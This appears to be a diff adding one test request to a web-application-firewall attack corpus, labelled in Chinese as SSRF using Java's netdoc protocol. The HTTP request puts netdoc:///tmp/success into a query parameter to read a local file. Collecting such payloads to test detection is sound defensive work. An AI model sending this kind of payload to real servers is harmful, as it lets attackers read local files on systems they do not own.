@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_NETDOC协议
+# Java 中 netdoc 协议可以替代 file 协议功能，利用Java netdoc协议读取文件
+GET /?id=netdoc:%2F%2F%2Ftmp%2Fsuccess&bid=hd_tag_m8mv24ne HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ne
+RM-PRO-Token: 3cdbfbbc6b49c3aadbf1118976bb5a0d
+RM-PRO-Time: 1742808394268
+User-Agent: curl/7.83.1
+
